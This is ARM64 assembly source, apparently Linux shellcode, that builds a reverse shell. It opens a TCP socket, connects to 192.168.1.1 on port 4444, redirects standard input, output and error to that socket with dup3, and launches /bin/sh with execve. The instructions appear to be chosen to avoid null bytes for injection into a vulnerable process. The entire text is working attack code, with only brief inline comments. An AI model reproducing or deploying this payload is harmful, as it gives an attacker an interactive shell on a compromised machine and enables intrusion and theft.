.section .text
.global _start

_start:
    // socket(AF_INET, SOCK_STREAM, 0) (2, 1, 0)

    eor x2, xzr, xzr
    eor x0, xzr, #2
    eor x1, x0, #3

    mov x8, #0xc6 // SYS_socket

    svc #0x1337

    stp x0, xzr, [sp, #-0x10] // save server fd

    // connect(sockfd, &saddr, 0x10)

    movk x1, #0xff02
    movk x1, #0x5c11, lsl #0x10 // Port number = htons(4444)
    movk x1, #0xa8c0, lsl #0x20 // IP address = htonl(192.168.1.1)
    movk x1, #0x0101, lsl #0x30

    stp x1, xzr, [sp, #-0x40]

    // sockaddr_in structure is now @ sp - 0x40

    sub x1, sp, #0x40
    strb wzr, [sp, #-0x3f]

    eor x2, xzr, #0x10

    mov x8, #0xcb // SYS_connect
    svc #0x1337

    // dup3(clientfd, [0, 1, 2])

    movk x3, #0x0102
    eor x2, xzr, xzr

    dupfd:
        ldr x0, [sp, #-0x10]
        and x1, x3, #0xff
        mov x8, #0x18 // SYS_dup3
        svc #0x1337
        lsr x3, x3, #8
        cmp xzr, x1
        bne dupfd

    // execve("/bin/sh", NULL, NULL)

    movk x1, #0x622f
    movk x1, #0x6e69, lsl #0x10
    movk x1, #0x2f2f, lsl #0x20
    movk x1, #0x6873, lsl #0x30

    eor x2, xzr, xzr
    stp x1, x2, [sp], #0x40
    eor x1, xzr, xzr
    
    sub x0, sp, #0x40

    mov x8, #0xdd // SYS_execve

    svc #0x1337
